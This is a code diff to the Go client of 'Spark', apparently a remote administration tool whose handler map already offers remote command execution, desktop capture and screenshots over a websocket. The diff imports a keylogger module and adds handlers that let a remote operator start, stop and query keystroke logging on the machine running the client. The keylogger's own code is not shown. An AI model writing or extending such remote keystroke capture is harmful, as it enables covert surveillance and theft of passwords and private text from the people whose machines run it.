@@ -5,6 +5,7 @@ import (
 	"Spark/client/service/basic"
 	"Spark/client/service/desktop"
 	"Spark/client/service/file"
+	"Spark/client/service/keylogger"
 	"Spark/client/service/process"
 	Screenshot "Spark/client/service/screenshot"
 	"Spark/client/service/terminal"
@@ -43,6 +44,9 @@ var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
 	`DESKTOP_KILL`:     killDesktop,
 	`DESKTOP_SHOT`:     getDesktop,
 	`COMMAND_EXEC`:     execCommand,
+	`KEYLOGGER_START`:  keyloggerStart,
+	`KEYLOGGER_STOP`:   keyloggerStop,
+	`KEYLOGGER_STATUS`: keyloggerStatus,
 }
 
 func ping(pack modules.Packet, wsConn *common.Conn) {
@@ -369,6 +373,19 @@ func execCommand(pack modules.Packet, wsConn *common.Conn) {
 		}}, pack)
 		proc.Process.Release()
 	}
+}
+
+// Keylogger handlers
+func keyloggerStart(pack modules.Packet, wsConn *common.Conn) {
+	keylogger.HandleAction(wsConn, modules.Packet{Act: "keylogger_start", Data: pack.Data})
+}
+
+func keyloggerStop(pack modules.Packet, wsConn *common.Conn) {
+	keylogger.HandleAction(wsConn, modules.Packet{Act: "keylogger_stop", Data: pack.Data})
+}
+
+func keyloggerStatus(pack modules.Packet, wsConn *common.Conn) {
+	keylogger.HandleAction(wsConn, modules.Packet{Act: "keylogger_status", Data: pack.Data})
 }
 
 func inputRawTerminal(pack []byte, event string) {
